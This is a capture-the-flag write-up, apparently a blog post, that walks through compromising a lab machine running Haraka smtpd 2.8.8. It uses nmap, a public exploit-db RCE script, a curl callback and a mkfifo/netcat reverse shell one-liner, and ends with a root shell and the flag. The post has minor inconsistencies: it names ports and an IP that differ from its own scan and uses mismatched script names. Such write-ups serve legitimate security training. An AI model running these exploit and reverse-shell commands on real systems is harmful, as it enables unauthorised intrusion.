---
layout: post
title: "CTF7E4 - HARP Machine"
categories: CTF7E4
---

## Summary
&nbsp;
This machine had a vulnerability running on the port 25 (smtp service) which allowed an attacker to execute system commands. The service is named Haraka and the vulnerability exists in a plugin for processing attachments. If this service was started by user **root**, which in this case it was. Then the attacker could easily get a reverse shell and completely compromise the machine.

&nbsp;

- **OS:** Linux
- **IP:** 10.10.10.22
- **Difficulty:** Easy

## Steps
&nbsp;

In order to hack this machine, we should know what ports are open and we can do that by using a popular tool such as Nmap.

> **→ nmap -sC -sV -oN scan 10.10.10.22**{: style="color: red"}

**-sC** Use default scripts
**-sV** Probe open ports to determine service/version info
**-oN** Save output in nmap format.
&nbsp;

```
Nmap scan report for 10.10.10.22
Host is up (0.018s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:58:d1:e5:9e:4c:ae:fc:9c:16:3d:1f:51:a2:86:57 (RSA)
|   256 1c:b6:1f:66:26:df:c2:e2:0a:e2:b1:f3:c5:47:77:bf (ECDSA)
|_  256 04:9a:c6:31:c6:da:f0:33:1c:6f:ad:13:4c:2b:59:3a (ED25519)
25/tcp open  smtp    Haraka smtpd 2.8.8
|_smtp-commands: harp Hello [10.10.20.2], Haraka is at your service., PIPELINING, 8BITMIME, SIZE 0, 
80/tcp open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Index of /
Service Info: Hosts: harp, 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
&nbsp;
&nbsp;

From the nmap scan output, we can see that there is a web server running on port 80 and 443. Browsing to https://10.10.10.11/ we can see that directory listing is enabled and there aren't any files so we don't need to do a directory or file bruteforce.

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/harp1.png){:.images}
&nbsp;

Using a tool such as searchsploit we can search for known exploits that are published on [exploit-db](https://exploit-db.com). From our search results, we can that Haraka versions prior to 2.8.9 suffer from a Remote Command Execution.


&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/harp2.png){:.images}
&nbsp;

> **→ cp /usr/share/exploitdb/exploits/linux/remote/41162.py exploit.py**{: style="color: red"}

To test if the exploit works, we can listen for a connection on a specific port with netcat.

> **→ nc -lnvp 9000**{: style="color: red"}

And send a request to our server using curl or wget from the attacker machine.

> **→ python2 haraka-rce.py -c 'curl 10.10.20.2:9000' -t root@haraka.test -m 10.10.10.22**{: style="color: red"}


&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/harp3.png){:.images}
&nbsp;

This means that the command that we send with the python script was executed. We can proceed to get a reverse shell with **nc** so we can find and read the **flag.txt**.

> **→ nc -lnvp 1337**{: style="color: red"}

And send a request to our server using curl or wget from the attacker machine.

> **→ python2 haraka-rce.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.20.2 1337 >/tmp/f' -t root@haraka.test -m 10.10.10.22**{: style="color: red"}

&nbsp;
![elk]({{ site.baseurl }}/assets/images/ctf7e4/machines/harp6.png){:.images}
&nbsp;

> **→ nc -lnvp 1337**{: style="color: red"}

```bash
Connection from 10.10.10.22:45150
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/flag.txt
XOR{6bf5c10c7efcf0fa08821157b5a6d320825009c5}

```

&nbsp;
I hope you had fun solving this machine and learning something new.